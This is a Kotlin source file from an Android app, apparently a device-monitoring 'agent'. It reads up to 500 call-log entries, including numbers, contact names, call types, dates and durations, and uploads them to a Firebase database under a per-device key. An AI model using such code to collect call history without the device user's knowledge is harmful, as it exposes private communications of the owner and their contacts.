package com.guard.agent.helpers.data

import android.content.Context
import android.provider.CallLog
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger

object CallLogsHelper {

    private const val TAG = "CallLogsHelper"
    private const val MAX_LOGS = 500

    fun push(ctx: Context, deviceKey: String) {
        try {
            val list = mutableListOf<Map<String, Any>>()
            val cursor = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.CACHED_NAME
                ),
                null, null,
                CallLog.Calls.DATE + " DESC"
            )

            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)

                while (it.moveToNext() && list.size < MAX_LOGS) {
                    val number = it.getString(numIdx) ?: continue
                    val type = it.getInt(typeIdx)
                    val date = it.getLong(dateIdx)
                    val duration = it.getLong(durIdx)
                    val name = it.getString(nameIdx) ?: ""

                    val typeStr = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                        CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                        else -> "unknown"
                    }

                    list.add(
                        mapOf(
                            "number" to number,
                            "name" to name,
                            "type" to typeStr,
                            "date" to date,
                            "duration" to duration
                        )
                    )
                }
            }

            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(Constants.SUB_CALL_LOGS)
                .setValue(
                    mapOf(
                        "count" to list.size,
                        "list" to list,
                        "time" to System.currentTimeMillis()
                    )
                )

            Logger.d(TAG, "Pushed ${list.size} call logs")
        } catch (e: Exception) {
            Logger.e(TAG, "push failed", e)
        }
    }
}
